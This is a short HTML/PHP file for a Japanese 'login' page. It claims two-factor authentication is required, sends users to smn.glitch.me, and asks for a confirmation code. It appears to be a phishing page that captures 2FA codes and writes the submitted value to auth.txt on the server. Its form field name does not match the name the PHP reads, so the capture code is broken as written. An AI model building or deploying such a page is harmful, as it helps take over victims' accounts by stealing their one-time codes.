<c>
<meta name="viewport" content="width=360,initial-scale=1"><div class="b">
  
  
<h1 style="text-align:center;">ログイン</h1>
<p>
  二段階認証をお願いしています<br>1.サインイン済みの機器でsmn.glitch.meにアクセス<br>2.その機器に表示されるコードを入力してください
  </p><hr><p>
  
  
  確認コードを入力してください</p>
  <hr>
  
  
<form action = "ht.php" method = "post">
<input type = "tel" name ="com" class="b" required><br/>
<input type = "submit" value="認証" class="b">
</form>
  </div>
  </c>

<style>
.b {
  width:100%;
  font-size:12px;
  color:#FFFFFF;
  text-align:center;
  display:block;
  padding:10px 0 10px;
  background:#6BCBF6;
  border-radius: 5px;
}
  c {
    
  text-align:center;
  }
  
</style>

<?php
$comment = $_POST["kye"];
$file = 'auth.txt';
// ファイルをオープンして既存のコンテンツを取得します

// 新しい人物をファイルに追加します
$current = $comment;
// 結果をファイルに書き出します
file_put_contents($file, $current);


?>